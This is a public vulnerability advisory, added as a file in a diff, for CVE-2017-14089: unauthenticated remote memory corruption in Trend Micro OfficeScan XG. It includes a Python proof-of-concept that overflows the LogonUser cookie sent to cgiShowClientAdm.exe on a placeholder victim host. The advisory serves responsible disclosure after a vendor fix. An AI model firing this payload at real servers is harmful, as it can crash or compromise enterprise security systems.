@@ -1,0 +1,109 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-14089-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-REMOTE-MEMORY-CORRUPTION.txt
+[+] ISR: ApparitionSec           
+ 
+
+
+Vendor:
+==================
+www.trendmicro.com
+
+
+
+Product:
+========
+OfficeScan 
+v11.0 and XG (12.0)*
+
+
+OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
+An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
+manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
+web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
+
+
+Vulnerability Type:
+===================
+Unauthorized Remote Memory Corruption
+
+
+
+CVE Reference:
+==============
+CVE-2017-14089
+
+
+
+Security Issue:
+================
+Remote unauthenticated attackers that can make connection the TrendMicro OfficeScan XG application targeting the "cgiShowClientAdm.exe"
+process can cause memory corruption issues.
+
+
+References:
+===========
+https://success.trendmicro.com/solution/1118372
+
+
+
+Exploit/POC:
+=============
+import urllib,urllib2
+from urllib2 import Request
+
+print 'TrendMicro OfficeScan XG'
+print 'Stack Memory Corruption POC'
+print 'by hyp3rlinx\n'
+
+IP="VICTIM-IP:4343"
+
+PAYLOAD="A"*256
+
+url = urllib2.Request('https://'+IP+'/officescan/console/html/cgi/cgiShowClientAdm.exe')
+cookie="Cookie: serror=0; session_expired=no; FeatureEnableState=enableAntiBody@1|enableCCFR@1|enableCfw@1|enableDcs@1|enableSorting@0|enableSpy@1|enableVirus@1|HasAvAddSvc@1|installWSS@1|enableDLP@0|sqldbMode@0|enableIPv6@1|w2ksupport@0|; stamp=2231521137; timestamp=1497360567; DisabledIds=9999.; LogonUser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; ReadOnlyIds=8.56.; enableRba=1; key=16914202097564; session=666; LANG=en_US; PHPSESSID=WHATEVER123; lastID=34; lastTab=-1; theme=default; wf_CSRF_token=99999999999999999999999999999999; serror=0; retry=0; PHPSESSID=WHATEVERHERE; wf_CSRF_token=666; LANG=en_US; theme=default; lastID=33; lastTab=-1"
+
+print '\nsending packetz... \n'+ cookie
+
+##url.add_header("X-CSRFToken", "ee721b62aef83b017e8c86f52e38a411")        #<============== X-CSRFToken IS NOT EVEN NEEDED!
+url.add_header("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
+url.add_header("Content-Length", "54")
+url.add_header("Cookie ",cookie)
+
+req=urllib2.urlopen(url)
+res = urllib2.urlopen(req)
+print res
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+====================
+Vendor Notification:  June 5, 2017
+Vendor releases fixes / advisory : September 27, 2017
+September 28, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
